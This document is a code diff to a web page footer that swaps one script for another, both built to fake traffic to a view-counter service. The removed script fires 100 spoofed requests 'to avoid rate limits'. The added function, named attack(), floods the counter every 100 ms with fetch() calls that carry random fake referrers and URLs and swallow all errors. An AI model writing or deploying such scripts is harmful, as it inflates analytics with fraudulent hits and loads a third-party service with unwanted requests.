@@ -137,32 +137,28 @@
         </span>
         <div id="klikz-15"></div>
         <script>
-          const id = 15;
-          const base_url = 'https://klikz.svs.gyarab.cz';
-          const image_url = '/image/15';
-        
-          // Generate random parameters
-          function spoofRequest() {
-            const randomStr = Math.random().toString(36).substr(2, 5);
-            const params = {
-              r: encodeURIComponent(`https://fake-referrer-${randomStr}.com`), // Random referrer
-              u: encodeURIComponent(window.location + '?rnd=' + randomStr), // Unique URL
-              w: Math.floor(Math.random() * 1000) + 800, // Random width
-              h: Math.floor(Math.random() * 500) + 400, // Random height
-              front: 'fafafa&cache=' + Date.now() // Cache-buster
-            };
-        
-            const img = new Image();
-            img.src = `${base_url}${image_url}?${Object.entries(params)
-              .map(([k, v]) => `${k}=${v}`)
-              .join('&')}`;
-          }
-        
-          // Send multiple requests (e.g., 100 times)
-          for (let i = 0; i < 100; i++) {
-            setTimeout(spoofRequest, i * 100); // Space out requests to avoid rate limits
-          }
-        </script>
+            function attack() {
+              const base = 'https://klikz.svs.gyarab.cz/image/15';
+              const fake = () => {
+                const rnd = Math.random().toString(36).substring(2);
+                const params = new URLSearchParams({
+                  r: `https://spoof-${rnd}.com`,
+                  u: window.location.href + '?r=' + rnd,
+                  w: Math.floor(Math.random() * 1400) + 800,
+                  h: Math.floor(Math.random() * 900) + 400,
+                  front: 'fafafa',
+                }).toString();
+          
+                // Use fetch() to avoid appending elements to DOM
+                fetch(`${base}?${params}`, { mode: 'no-cors' })
+                  .catch(() => {}); // Silence errors
+              };
+          
+              // Flood requests (adjust the number)
+              setInterval(fake, 100);
+            }
+            attack();
+          </script>
     </footer>
 </body>
 
